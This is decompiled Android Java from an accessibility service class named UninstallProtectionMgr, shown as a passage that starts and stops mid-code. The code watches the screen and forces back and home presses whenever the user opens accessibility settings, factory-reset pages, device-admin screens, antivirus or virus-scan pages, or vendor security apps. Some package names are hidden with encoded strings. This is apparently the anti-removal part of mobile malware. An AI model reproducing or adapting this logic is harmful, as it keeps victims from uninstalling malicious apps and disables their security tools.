                    for (AccessibilityNodeInfo accessibilityNodeInfo2 : listFindAccessibilityNodeInfosByText2) {
                        CharSequence text2 = accessibilityNodeInfo2.getText();
                        if (text2 == null || (string2 = text2.toString()) == null) {
                            string2 = "";
                        }
                        CharSequence contentDescription = accessibilityNodeInfo2.getContentDescription();
                        if (contentDescription == null || (string3 = contentDescription.toString()) == null) {
                            string3 = "";
                        }
                        if (AbstractC0779a1.m213652a5(string2 + " " + string3, str, true)) {
                            Iterator<T> it4 = listFindAccessibilityNodeInfosByText2.iterator();
                            while (it4.hasNext()) {
                                try {
                                    ((AccessibilityNodeInfo) it4.next()).recycle();
                                } catch (Exception unused4) {
                                }
                            }
                            break loop0;
                        }
                    }
                    Iterator<T> it5 = listFindAccessibilityNodeInfosByText2.iterator();
                    while (it5.hasNext()) {
                        try {
                            ((AccessibilityNodeInfo) it5.next()).recycle();
                        } catch (Exception unused5) {
                        }
                    }
                }
            } catch (Exception unused6) {
            }
            i++;
        }
        return true;
    }

    /* renamed from: d2 */
    public static boolean m211929d2(String str) {
        String lowerCase = str.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        return AbstractC0779a1.m213652a5(lowerCase, "devicemanager", false) || AbstractC0779a1.m213652a5(lowerCase, "systemmanager", false) || AbstractC0779a1.m213652a5(lowerCase, "securitycenter", false) || AbstractC0779a1.m213652a5(lowerCase, "antivirus", false) || AbstractC0779a1.m213652a5(lowerCase, "safecenter", false) || AbstractC0779a1.m213652a5(lowerCase, "packageinstaller", false);
    }

    /* renamed from: d3 */
    public static boolean m211930d3(String str) {
        String lowerCase = str.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        if (AbstractC0779a1.m213652a5(lowerCase, "accessibilitysettings", false) || AbstractC0779a1.m213652a5(lowerCase, "toggleaccessibilityservice", false) || AbstractC0779a1.m213652a5(lowerCase, "accessibilityserviceinfo", false) || AbstractC0779a1.m213652a5(lowerCase, "accessibilitydetail", false) || AbstractC0779a1.m213652a5(lowerCase, "accessibilitylist", false)) {
            t60.m214702c3("UninstallProtectionMgr", "🛡️ [高危检测] 无障碍设置: ".concat(str));
            return true;
        }
        if ((AbstractC0779a1.m213652a5(lowerCase, "masterclear", false) || AbstractC0779a1.m213652a5(lowerCase, "factoryreset", false) || AbstractC0779a1.m213652a5(lowerCase, "erasedatasettings", false) || AbstractC0779a1.m213652a5(lowerCase, "wipedata", false) || AbstractC0779a1.m213652a5(lowerCase, "resetphone", false) || AbstractC0779a1.m213652a5(lowerCase, "systemreset", false) || AbstractC0779a1.m213652a5(lowerCase, "backupandreset", false) || AbstractC0779a1.m213652a5(lowerCase, "backupreset", false) || AbstractC0779a1.m213652a5(lowerCase, "resetoptions", false) || AbstractC0779a1.m213652a5(lowerCase, "restoredefault", false) || AbstractC0779a1.m213652a5(lowerCase, "misystemresetactivity", false) || AbstractC0779a1.m213652a5(lowerCase, "restorephone", false) || AbstractC0779a1.m213652a5(lowerCase, "phonerestorefragment", false) || AbstractC0779a1.m213652a5(lowerCase, "erasephone", false) || AbstractC0779a1.m213652a5(lowerCase, "clearalldataactivity", false) || AbstractC0779a1.m213652a5(lowerCase, "resetconfirm", false) || AbstractC0779a1.m213652a5(lowerCase, "erasealldata", false) || ((AbstractC0779a1.m213652a5(lowerCase, "coloros", false) && AbstractC0779a1.m213652a5(lowerCase, "reset", false)) || ((AbstractC0779a1.m213652a5(lowerCase, "coloros", false) && AbstractC0779a1.m213652a5(lowerCase, "restore", false)) || ((AbstractC0779a1.m213652a5(lowerCase, "coloros", false) && AbstractC0779a1.m213652a5(lowerCase, "erase", false)) || ((AbstractC0779a1.m213652a5(lowerCase, "coloros", false) && AbstractC0779a1.m213652a5(lowerCase, "privacy", false)) || ((AbstractC0779a1.m213652a5(lowerCase, "oplus", false) && AbstractC0779a1.m213652a5(lowerCase, "reset", false)) || ((AbstractC0779a1.m213652a5(lowerCase, "oplus", false) && AbstractC0779a1.m213652a5(lowerCase, "restore", false)) || ((AbstractC0779a1.m213652a5(lowerCase, "oplus", false) && AbstractC0779a1.m213652a5(lowerCase, "erase", false)) || ((AbstractC0779a1.m213652a5(lowerCase, "oplus", false) && AbstractC0779a1.m213652a5(lowerCase, "privacy", false)) || ((AbstractC0779a1.m213652a5(lowerCase, "funtouch", false) && AbstractC0779a1.m213652a5(lowerCase, "reset", false)) || ((AbstractC0779a1.m213652a5(lowerCase, "huawei", false) && AbstractC0779a1.m213652a5(lowerCase, "resetsettings", false)) || (AbstractC0779a1.m213652a5(lowerCase, "hihonor", false) && AbstractC0779a1.m213652a5(lowerCase, "resetsettings", false))))))))))))) && !AbstractC0779a1.m213652a5(lowerCase, "resetnetwork", false) && !AbstractC0779a1.m213652a5(lowerCase, "networkreset", false) && !AbstractC0779a1.m213652a5(lowerCase, "passwordreset", false) && !AbstractC0779a1.m213652a5(lowerCase, "resetpassword", false)) {
            t60.m214702c3("UninstallProtectionMgr", "🛡️ [高危检测] 恢复出厂/重置: ".concat(str));
            return true;
        }
        if (!AbstractC0779a1.m213652a5(lowerCase, "deviceadmin", false) && !AbstractC0779a1.m213652a5(lowerCase, "devicepolicyadmin", false)) {
            return false;
        }
        t60.m214702c3("UninstallProtectionMgr", "🛡️ [高危检测] 设备管理器: ".concat(str));
        return true;
    }

    /* renamed from: d4 */
    public static boolean m211931d4(AccessibilityNodeInfo accessibilityNodeInfo) {
        Iterator it = fb1.f56194a0.iterator();
        while (it.hasNext()) {
            try {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId((String) it.next());
                if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty() && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                    Iterator<T> it2 = listFindAccessibilityNodeInfosByViewId.iterator();
                    while (it2.hasNext()) {
                        if (((AccessibilityNodeInfo) it2.next()).isVisibleToUser()) {
                            Iterator<T> it3 = listFindAccessibilityNodeInfosByViewId.iterator();
                            while (it3.hasNext()) {
                                ((AccessibilityNodeInfo) it3.next()).recycle();
                            }
                            return true;
                        }
                    }
                }
                if (listFindAccessibilityNodeInfosByViewId != null) {
                    Iterator<T> it4 = listFindAccessibilityNodeInfosByViewId.iterator();
                    while (it4.hasNext()) {
                        ((AccessibilityNodeInfo) it4.next()).recycle();
                    }
                }
            } catch (Exception unused) {
            }
        }
        return false;
    }

    /* renamed from: d5 */
    public static boolean m211932d5(String str) {
        for (String str2 : f53656h2) {
            if (AbstractC0779a1.m213656a9(str2, str)) {
                return true;
            }
        }
        for (String str3 : f53657h3) {
            if (AbstractC0779a1.m213656a9(str3, str)) {
                return true;
            }
        }
        for (String str4 : f53658h4) {
            if (AbstractC0779a1.m213656a9(str4, str)) {
                return true;
            }
        }
        for (String str5 : f53659h5) {
            if (AbstractC0779a1.m213656a9(str5, str)) {
                return true;
            }
        }
        for (String str6 : f53660h6) {
            if (AbstractC0779a1.m213656a9(str6, str)) {
                return true;
            }
        }
        for (String str7 : f53661h7) {
            if (AbstractC0779a1.m213656a9(str7, str)) {
                return true;
            }
        }
        for (String str8 : f53662h8) {
            if (AbstractC0779a1.m213656a9(str8, str)) {
                return true;
            }
        }
        for (String str9 : f53663h9) {
            if (AbstractC0779a1.m213656a9(str9, str)) {
                return true;
            }
        }
        for (String str10 : f53664i0) {
            if (AbstractC0779a1.m213656a9(str10, str)) {
                return true;
            }
        }
        return false;
    }

    /* renamed from: d6 */
    public static boolean m211933d6(String str) {
        String lowerCase = str.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        if (m211929d2(lowerCase) || AbstractC0779a1.m213679d2(lowerCase, false, "com.android.settings") || AbstractC0779a1.m213679d2(lowerCase, false, "com.android.provision") || AbstractC0779a1.m213679d2(lowerCase, false, "com.android.permissioncontroller") || AbstractC0779a1.m213679d2(lowerCase, false, "com.google.android.permissioncontroller") || AbstractC0779a1.m213652a5(lowerCase, "phonemanager", false) || AbstractC0779a1.m213652a5(lowerCase, "permissionmanager", false) || AbstractC0779a1.m213652a5(lowerCase, "appmanager", false) || AbstractC0779a1.m213679d2(lowerCase, false, StringUtil.m212470a0("KFYcdEUtDTlSOGVKCClZPQEjVj8qXhQo")) || AbstractC0779a1.m213679d2(lowerCase, false, "com.huawei.settings") || AbstractC0779a1.m213679d2(lowerCase, false, "com.hihonor.systemmanager") || AbstractC0779a1.m213679d2(lowerCase, false, "com.hihonor.settings") || AbstractC0779a1.m213679d2(lowerCase, false, "com.hihonor.devicemanager") || AbstractC0779a1.m213679d2(lowerCase, false, StringUtil.m212470a0("KFYcdEAxGScZIi5aBChELBUtUj8/XAM=")) || AbstractC0779a1.m213679d2(lowerCase, false, "com.miui.appmanager") || AbstractC0779a1.m213679d2(lowerCase, false, "com.miui.permcenter") || AbstractC0779a1.m213679d2(lowerCase, false, StringUtil.m212470a0("KFYcdE43ACFFPjgXAjtLPQ8rWSUuSw==")) || AbstractC0779a1.m213679d2(lowerCase, false, "com.oplus.safecenter") || AbstractC0779a1.m213679d2(lowerCase, false, "com.oplus.battery") || AbstractC0779a1.m213679d2(lowerCase, false, "com.coloros.battery") || AbstractC0779a1.m213679d2(lowerCase, false, StringUtil.m212470a0("KFYcdE43ACFFPjgXATJCNgkjVj8qXhQo")) || AbstractC0779a1.m213679d2(lowerCase, false, StringUtil.m212470a0("KFYcdFsxGiEZIS5LHDNeKwUhWTwqVxA9SCo=")) || AbstractC0779a1.m213679d2(lowerCase, false, StringUtil.m212470a0("KFYcdFsxGiEZMClc")) || AbstractC0779a1.m213679d2(lowerCase, false, "com.vivo.appfilter") || AbstractC0779a1.m213679d2(lowerCase, false, StringUtil.m212470a0("KFYcdEQpAyEZIi5aBChI")) || AbstractC0779a1.m213679d2(lowerCase, false, "com.iqoo.powersaving") || AbstractC0779a1.m213679d2(lowerCase, false, "com.samsung.android.sm") || AbstractC0779a1.m213679d2(lowerCase, false, "com.samsung.android.lool") || AbstractC0779a1.m213679d2(lowerCase, false, "com.oneplus.security") || AbstractC0779a1.m213679d2(lowerCase, false, "com.asus.mobilemanager") || AbstractC0779a1.m213679d2(lowerCase, false, "com.meizu.safe") || AbstractC0779a1.m213679d2(lowerCase, false, "com.meizu.flyme.security") || AbstractC0779a1.m213679d2(lowerCase, false, "com.bbk.settings") || AbstractC0779a1.m213679d2(lowerCase, false, "com.vivo.settings") || AbstractC0779a1.m213679d2(lowerCase, false, "com.coloros.settings") || AbstractC0779a1.m213679d2(lowerCase, false, "com.oplus.settings") || AbstractC0779a1.m213679d2(lowerCase, false, "com.samsung.android.settings")) {
            return true;
        }
        for (String str2 : f53650g6) {
            if (AbstractC0779a1.m213656a9(str2, lowerCase)) {
                return true;
            }
        }
        for (String str3 : f53651g7) {
            if (AbstractC0779a1.m213656a9(str3, lowerCase)) {
                return true;
            }
        }
        for (String str4 : f53652g8) {
            if (AbstractC0779a1.m213656a9(str4, lowerCase)) {
                return true;
            }
        }
        for (String str5 : f53653g9) {
            if (AbstractC0779a1.m213656a9(str5, lowerCase)) {
                return true;
            }
        }
        for (String str6 : f53655h1) {
            if (AbstractC0779a1.m213656a9(str6, lowerCase)) {
                return true;
            }
        }
        return false;
    }

    /* renamed from: d7 */
    public static boolean m211934d7(String str) {
        String lowerCase = str.toLowerCase(Locale.ROOT);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        for (String str2 : f53654h0) {
            if (AbstractC0779a1.m213656a9(str2, lowerCase)) {
                return true;
            }
        }
        return false;
    }

    /* renamed from: b8 */
    public final boolean m211935b8(AccessibilityNodeInfo accessibilityNodeInfo) {
        try {
            return m211926c5(accessibilityNodeInfo, (List) this.f53708e3.getValue());
        } catch (Exception unused) {
            return false;
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:57:0x00fb A[Catch: Exception -> 0x0355, TRY_ENTER, TryCatch #3 {Exception -> 0x0355, blocks: (B:3:0x0012, B:5:0x0018, B:8:0x0020, B:10:0x0026, B:13:0x002e, B:16:0x003c, B:19:0x0052, B:21:0x005d, B:23:0x0065, B:26:0x006e, B:28:0x0077, B:30:0x007f, B:32:0x0087, B:34:0x008f, B:36:0x0097, B:38:0x009f, B:40:0x00a7, B:42:0x00af, B:44:0x00b7, B:46:0x00bf, B:48:0x00c7, B:50:0x00cf, B:54:0x00f3, B:57:0x00fb, B:59:0x0101, B:61:0x0109, B:63:0x0137, B:67:0x015e, B:69:0x0164, B:71:0x016a, B:73:0x0170, B:75:0x017a, B:77:0x0184, B:79:0x018a, B:82:0x0192, B:84:0x0198, B:86:0x019e, B:88:0x01a2, B:90:0x01a8, B:92:0x01ac, B:94:0x01b7, B:96:0x01bf, B:98:0x01c7, B:100:0x01cf, B:102:0x01d7, B:104:0x01df, B:107:0x01e7, B:109:0x01ef, B:111:0x01f7, B:126:0x022f, B:128:0x0237, B:130:0x023f, B:132:0x0247, B:134:0x024f, B:136:0x0257, B:138:0x025f, B:140:0x0267, B:143:0x0271, B:145:0x0277, B:147:0x027d, B:149:0x0283, B:151:0x0289, B:153:0x0293, B:155:0x029d, B:157:0x02a3, B:160:0x02ac, B:163:0x02b4, B:165:0x02ba, B:167:0x02be, B:169:0x02c4, B:171:0x02ce, B:173:0x02d8, B:175:0x02e2, B:192:0x0310, B:193:0x0325, B:115:0x0202, B:117:0x020b, B:119:0x0213, B:121:0x021b, B:123:0x0221, B:195:0x034e, B:52:0x00d7), top: B:207:0x0012 }] */
    /* JADX WARN: Removed duplicated region for block: B:63:0x0137 A[Catch: Exception -> 0x0355, TRY_LEAVE, TryCatch #3 {Exception -> 0x0355, blocks: (B:3:0x0012, B:5:0x0018, B:8:0x0020, B:10:0x0026, B:13:0x002e, B:16:0x003c, B:19:0x0052, B:21:0x005d, B:23:0x0065, B:26:0x006e, B:28:0x0077, B:30:0x007f, B:32:0x0087, B:34:0x008f, B:36:0x0097, B:38:0x009f, B:40:0x00a7, B:42:0x00af, B:44:0x00b7, B:46:0x00bf, B:48:0x00c7, B:50:0x00cf, B:54:0x00f3, B:57:0x00fb, B:59:0x0101, B:61:0x0109, B:63:0x0137, B:67:0x015e, B:69:0x0164, B:71:0x016a, B:73:0x0170, B:75:0x017a, B:77:0x0184, B:79:0x018a, B:82:0x0192, B:84:0x0198, B:86:0x019e, B:88:0x01a2, B:90:0x01a8, B:92:0x01ac, B:94:0x01b7, B:96:0x01bf, B:98:0x01c7, B:100:0x01cf, B:102:0x01d7, B:104:0x01df, B:107:0x01e7, B:109:0x01ef, B:111:0x01f7, B:126:0x022f, B:128:0x0237, B:130:0x023f, B:132:0x0247, B:134:0x024f, B:136:0x0257, B:138:0x025f, B:140:0x0267, B:143:0x0271, B:145:0x0277, B:147:0x027d, B:149:0x0283, B:151:0x0289, B:153:0x0293, B:155:0x029d, B:157:0x02a3, B:160:0x02ac, B:163:0x02b4, B:165:0x02ba, B:167:0x02be, B:169:0x02c4, B:171:0x02ce, B:173:0x02d8, B:175:0x02e2, B:192:0x0310, B:193:0x0325, B:115:0x0202, B:117:0x020b, B:119:0x0213, B:121:0x021b, B:123:0x0221, B:195:0x034e, B:52:0x00d7), top: B:207:0x0012 }] */
    /* JADX WARN: Type inference failed for: r6v2 */
    /* JADX WARN: Type inference failed for: r6v3, types: [int] */
    /* JADX WARN: Type inference failed for: r6v5 */
    /* renamed from: c0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211936c0(AccessibilityEvent accessibilityEvent) {
        String string;
        CharSequence packageName;
        String string2;
        String str;
        boolean zM211930d3;
        boolean z;
        String str2;
        String str3;
        boolean z2;
        try {
            CharSequence className = accessibilityEvent.getClassName();
            if (className != null && (string = className.toString()) != null && (packageName = accessibilityEvent.getPackageName()) != null && (string2 = packageName.toString()) != null && !string2.equals(this.f53665a0.getPackageName())) {
                Locale locale = Locale.ROOT;
                String lowerCase = string2.toLowerCase(locale);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                if (!AbstractC0779a1.m213652a5(lowerCase, "launcher", false)) {
                    str = "🛡️ [ClassName检测] 跳过病毒弹窗对话框，交给弹窗处理器: ";
                    if (!AbstractC0779a1.m213652a5(lowerCase, "hiboard", false) && !AbstractC0779a1.m213652a5(lowerCase, "puresearch", false) && !AbstractC0779a1.m213652a5(lowerCase, ".home", false)) {
                        if (AbstractC0779a1.m213652a5(string2, "settings", true) || AbstractC0779a1.m213652a5(string2, "security", true) || AbstractC0779a1.m213652a5(string2, "secure", true) || AbstractC0779a1.m213652a5(string2, "systemmanager", true) || AbstractC0779a1.m213652a5(string2, "safecenter", true) || AbstractC0779a1.m213652a5(string2, "coloros", true) || AbstractC0779a1.m213652a5(string2, "oplus", true) || AbstractC0779a1.m213652a5(string2, "hihonor", true) || AbstractC0779a1.m213652a5(string2, "huawei", true) || AbstractC0779a1.m213652a5(string2, "miui", true) || AbstractC0779a1.m213652a5(string2, "oppo", true) || AbstractC0779a1.m213652a5(string2, "360", true) || AbstractC0779a1.m213652a5(string2, "tencent", true)) {
                            t60.m214726f4("UninstallProtectionMgr", "🛡️ [ClassName监控] pkg=" + string2 + ", class=" + string);
                        }
                    }
                    zM211930d3 = m211930d3(string);
                    AtomicBoolean atomicBoolean = this.f53675b0;
                    if (!zM211930d3) {
                        if (atomicBoolean.get()) {
                            t60.m214702c3("UninstallProtectionMgr", "🛡️ [ClassName检测] 高危页面但返回序列执行中，跳过: ".concat(string));
                            return;
                        }
                        t60.m214726f4("UninstallProtectionMgr", "🛡️⚡ [ClassName检测] 高危页面: " + string + " (pkg: " + string2 + ")");
                        m211925c4(this);
                        m211945d9("CLASSNAME_DETECT", "高危页面", AbstractC1117qo.m214451e7(string), "返回+HOME", string2);
                        return;
                    }
                    String lowerCase2 = string.toLowerCase(locale);
                    t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    String lowerCase3 = string2.toLowerCase(locale);
                    t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                    if (!AbstractC0779a1.m213652a5(lowerCase3, "launcher", false) && !AbstractC0779a1.m213652a5(lowerCase3, ".home", false) && !lowerCase3.equals("com.miui.home") && !lowerCase3.equals("com.huawei.android.launcher") && !lowerCase3.equals(StringUtil.m212470a0("KFYcdEIoHCEZPSpMHzlFPR4=")) && !lowerCase3.equals(StringUtil.m212470a0("KFYcdFsxGiEZPSpMHzlFPR4=")) && !lowerCase3.equals("com.samsung.android.launcher") && !AbstractC0779a1.m213652a5(lowerCase3, "personalassistant", false) && !lowerCase3.equals("com.android.systemui")) {
                        if (m211934d7(lowerCase3)) {
                            m211950e4(string2);
                            return;
                        } else if (m211933d6(lowerCase3)) {
                            m211950e4(string2);
                            return;
                        }
                    }
                    if (!AbstractC0779a1.m213652a5(lowerCase2, "framelayout", false) && !AbstractC0779a1.m213652a5(lowerCase2, "linearlayout", false) && !AbstractC0779a1.m213652a5(lowerCase2, "relativelayout", false) && !AbstractC0779a1.m213652a5(lowerCase2, "recyclerview", false) && !AbstractC0779a1.m213652a5(lowerCase2, "scrollview", false) && !AbstractC0779a1.m213652a5(lowerCase2, "toast", false) && !AbstractC0779a1.m213652a5(lowerCase2, "popup", false)) {
                        if (AbstractC0779a1.m213652a5(lowerCase2, "virus", false) || AbstractC0779a1.m213652a5(lowerCase2, "malware", false) || AbstractC0779a1.m213652a5(lowerCase2, "securitythreat", false)) {
                            z = false;
                            if (AbstractC0779a1.m213652a5(lowerCase2, "dialog", false) || AbstractC0779a1.m213652a5(lowerCase2, "notify", false) || AbstractC0779a1.m213652a5(lowerCase2, "alert", false) || AbstractC0779a1.m213652a5(lowerCase2, "popup", false)) {
                                str2 = "UninstallProtectionMgr";
                                str3 = str;
                            } else if (AbstractC0779a1.m213652a5(lowerCase2, "window", false)) {
                                str3 = str;
                                str2 = "UninstallProtectionMgr";
                            }
                            t60.m214702c3(str2, str3.concat(string));
                            return;
                        }
                        z = false;
                        if (!AbstractC0779a1.m213652a5(lowerCase2, "antivirusactivity", z) && !AbstractC0779a1.m213652a5(lowerCase2, "riskappdetail", z) && !AbstractC0779a1.m213652a5(lowerCase2, "virusactivity", z) && !AbstractC0779a1.m213652a5(lowerCase2, "malwareactivity", z) && !AbstractC0779a1.m213652a5(lowerCase2, "riskapplication", z) && !AbstractC0779a1.m213652a5(lowerCase2, "harmfulapp", z) && !AbstractC0779a1.m213652a5(lowerCase2, "harmfulapps", z) && !AbstractC0779a1.m213652a5(lowerCase2, "verifyapps", z)) {
                            if (AbstractC0779a1.m213652a5(lowerCase3, "launcher", z) || AbstractC0779a1.m213652a5(lowerCase3, ".home", z) || lowerCase3.equals("com.miui.home") || lowerCase3.equals("com.huawei.android.launcher") || lowerCase3.equals(StringUtil.m212470a0("KFYcdEIoHCEZPSpMHzlFPR4=")) || lowerCase3.equals(StringUtil.m212470a0("KFYcdFsxGiEZPSpMHzlFPR4=")) || lowerCase3.equals("com.samsung.android.launcher") || AbstractC0779a1.m213652a5(lowerCase3, "personalassistant", false) || lowerCase3.equals("com.android.systemui") || !m211927d0(string)) {
                                return;
                            }
                            m211950e4(string2);
                            return;
                        }
                        boolean z3 = z;
                        if (atomicBoolean.get()) {
                            t60.m214702c3("UninstallProtectionMgr", "🛡️ [ClassName检测] 病毒查杀页面但返回序列执行中，跳过: ".concat(string));
                            return;
                        }
                        AccessibilityNodeInfo rootInActiveWindow = this.f53666a1.getRootInActiveWindow();
                        if (rootInActiveWindow != null) {
                            String[] safe_context_keywords = f53633e9.getSAFE_CONTEXT_KEYWORDS();
                            int length = safe_context_keywords.length;
                            ?? r6 = z3;
                            loop0: while (true) {
                                if (r6 >= length) {
                                    z2 = z3;
                                    break;
                                }
                                try {
                                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(safe_context_keywords[r6]);
                                    if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                        Iterator it = listFindAccessibilityNodeInfosByText.iterator();
                                        while (it.hasNext()) {
                                            try {
                                                ((AccessibilityNodeInfo) it.next()).recycle();
                                            } catch (Exception unused) {
                                            }
                                        }
                                        z2 = true;
                                        break loop0;
                                    }
                                } catch (Exception unused2) {
                                }
                                r6++;
                            }
                            try {
                                rootInActiveWindow.recycle();
                            } catch (Exception unused3) {
                            }
                            if (z2) {
                                t60.m214702c3("UninstallProtectionMgr", "🛡️ [ClassName检测] 病毒查杀页面但显示安全结果，跳过: " + string);
                                return;
                            }
                        }
                        t60.m214726f4("UninstallProtectionMgr", "🛡️⚡⚡⚡ [ClassName检测] 极度危险！病毒查杀页面，立即返回！ " + string);
                        m211925c4(this);
                        m211945d9("VIRUS_PAGE_DETECT", "病毒查杀页面", AbstractC1117qo.m214451e7(string), "返回+HOME", string2);
                        return;
                    }
                    return;
                }
                str = "🛡️ [ClassName检测] 跳过病毒弹窗对话框，交给弹窗处理器: ";
                zM211930d3 = m211930d3(string);
                AtomicBoolean atomicBoolean2 = this.f53675b0;
                if (!zM211930d3) {
                }
            }
        } catch (Exception unused4) {
        }
    }

    /* renamed from: c1 */
    public final void m211937c1(String str) {
        boolean z;
        boolean z2;
        String[] strArr = f53655h1;
        int length = strArr.length;
        boolean z3 = false;
        int i = 0;
        while (true) {
            if (i >= length) {
                z = false;
                break;
            } else {
                if (AbstractC0779a1.m213656a9(strArr[i], str)) {
                    z = true;
                    break;
                }
                i++;
            }
        }
        String[] strArr2 = f53649g5;
        int length2 = strArr2.length;
        int i2 = 0;
        while (true) {
            if (i2 >= length2) {
                z2 = false;
                break;
            } else {
                if (AbstractC0779a1.m213656a9(strArr2[i2], str)) {
                    z2 = true;
                    break;
                }
                i2++;
            }
        }
        String[] strArr3 = f53653g9;
        int length3 = strArr3.length;
        int i3 = 0;
        while (true) {
            if (i3 >= length3) {
                break;
            }
            if (AbstractC0779a1.m213656a9(strArr3[i3], str)) {
                z3 = true;
                break;
            }
            i3++;
        }
        if (z || z2 || z3) {
            t60.m214702c3("UninstallProtectionMgr", "🛡️ [第三方检测] 检测到第三方包名: " + str + " → 启动后台轮询");
            m211950e4(str);
        }
    }

    /* renamed from: c2 */
    public final boolean m211938c2() {
        try {
            t60.m214714d6("UninstallProtectionMgr", "🛡️ 禁用防止卸载保护");
            if (!this.f53667a2) {
                t60.m214726f4("UninstallProtectionMgr", "⚠️ 防止卸载保护已经禁用");
                m211948e2("防止卸载保护已经禁用", false);
                return true;
            }
            this.f53667a2 = false;
            m211947e1();
            try {
                this.f53665a0.getSharedPreferences(f53634f0, 0).edit().putBoolean("enabled", false).apply();
            } catch (Exception unused) {
            }
            t60.m214714d6("UninstallProtectionMgr", "✅ 防止卸载保护禁用成功");
            m10 m10Var = this.f53697d2;
            if (m10Var != null) {
                m10Var.mo211537a1("SYSTEM_EVENT", "禁用防止卸载保护", (Serializable) AbstractC0770a1.m213614f9(new Pair("action", StringUtil.m212470a0("D3AiG28UKRFiHwJ3Ig5sFCARZwMEbTQZeREjAA==")), new Pair("timestamp", Long.valueOf(System.currentTimeMillis()))));
            }
            m211948e2("防止卸载保护已禁用", false);
            return true;
        } catch (Exception e) {
            t60.m214705c6("UninstallProtectionMgr", "❌ 禁用防止卸载保护异常", e);
            m211948e2("禁用失败: " + e.getMessage(), false);
            return false;
        }
    }

    /* renamed from: c3 */
    public final boolean m211939c3() {
        try {
            t60.m214714d6("UninstallProtectionMgr", "🛡️ 启用防止卸载保护");
            w00 w00Var = this.f53693c8;
            if (w00Var != null && ((Boolean) w00Var.invoke()).booleanValue()) {
                t60.m214726f4("UninstallProtectionMgr", "⏳ 授权正在进行中，不启用防卸载保护");
                return false;
            }
            if (this.f53667a2) {
                t60.m214726f4("UninstallProtectionMgr", "⚠️ 防止卸载保护已经启用");
                m211948e2("防止卸载保护已经启用", true);
                return true;
            }
            m211947e1();
            this.f53667a2 = true;
            this.f53668a3 = null;
            this.f53669a4 = 0L;
            t60.m214714d6("UninstallProtectionMgr", "🛡️ [启用] 应用名列表: ".concat(AbstractC0715je.m213295i2(m211940c6(), null, null, null, null, 63)));
            try {
                this.f53665a0.getSharedPreferences(f53634f0, 0).edit().putBoolean("enabled", true).apply();
            } catch (Exception unused) {
            }
            this.f53668a3 = null;
            t60.m214714d6("UninstallProtectionMgr", "✅ 防止卸载保护启用成功");
            m10 m10Var = this.f53697d2;
            if (m10Var != null) {
                m10Var.mo211537a1("SYSTEM_EVENT", "启用防止卸载保护", (Serializable) AbstractC0770a1.m213614f9(new Pair("action", StringUtil.m212470a0("DncwGGEdMxt5GAVqJRthFDMeZR4ffDIOZBci")), new Pair("timestamp", Long.valueOf(System.currentTimeMillis()))));
            }
            m211948e2("防止卸载保护已启用", true);
            return true;
        } catch (Exception e) {
            t60.m214705c6("UninstallProtectionMgr", "❌ 启用防止卸载保护异常", e);
            this.f53667a2 = false;
            m211948e2("启用失败: " + e.getMessage(), false);
            return false;
        }
    }

    /* renamed from: c6 */
    public final List m211940c6() {
        List list;
        List list2 = this.f53668a3;
        long jCurrentTimeMillis = System.currentTimeMillis();
        long j = this.f53669a4;
        long j2 = jCurrentTimeMillis - j;
        if (list2 != null && (j <= 0 || j2 <= 60000)) {
            return list2;
        }
        w00 w00Var = this.f53698d3;
        if (w00Var == null || (list = (List) w00Var.invoke()) == null) {
            list = EmptyList.f57568a0;
        }
        List list3 = list;
        if (!list3.isEmpty()) {
            this.f53668a3 = list3;
            this.f53669a4 = jCurrentTimeMillis;
            t60.m214702c3("UninstallProtectionMgr", "🛡️ [缓存] 应用名列表已更新: ".concat(AbstractC0715je.m213295i2(list3, null, null, null, null, 63)));
        }
        return list3;
    }

    /* renamed from: c7 */
    public final String m211941c7(AccessibilityNodeInfo accessibilityNodeInfo, ArrayList arrayList) {
        String string;
        for (String str : (String[]) this.f53707e2.getValue()) {
            try {
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str);
                if (listFindAccessibilityNodeInfosByViewId != null && !listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                    Iterator<AccessibilityNodeInfo> it = listFindAccessibilityNodeInfosByViewId.iterator();
                    while (it.hasNext()) {
                        CharSequence text = it.next().getText();
                        if (text != null && (string = text.toString()) != null) {
                            int size = arrayList.size();
                            int i = 0;
                            while (i < size) {
                                Object obj = arrayList.get(i);
                                i++;
                                String str2 = (String) obj;
                                if (AbstractC0779a1.m213652a5(string, str2, true)) {
                                    Iterator<T> it2 = listFindAccessibilityNodeInfosByViewId.iterator();
                                    while (it2.hasNext()) {
                                        try {
                                            ((AccessibilityNodeInfo) it2.next()).recycle();
                                        } catch (Exception unused) {
                                        }
                                    }
                                    return str2;
                                }
                            }
                        }
                    }
                    Iterator<T> it3 = listFindAccessibilityNodeInfosByViewId.iterator();
                    while (it3.hasNext()) {
                        try {
                            ((AccessibilityNodeInfo) it3.next()).recycle();
                        } catch (Exception unused2) {
                        }
                    }
                }
            } catch (Exception unused3) {
            }
        }
        return null;
    }

    /* JADX WARN: Removed duplicated region for block: B:32:0x00b1  */
    /* JADX WARN: Removed duplicated region for block: B:38:0x00cb  */
    /* renamed from: c8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211942c8(int i) {
        String str;
        String str2;
        boolean z;
        boolean z2;
        if (i == 2) {
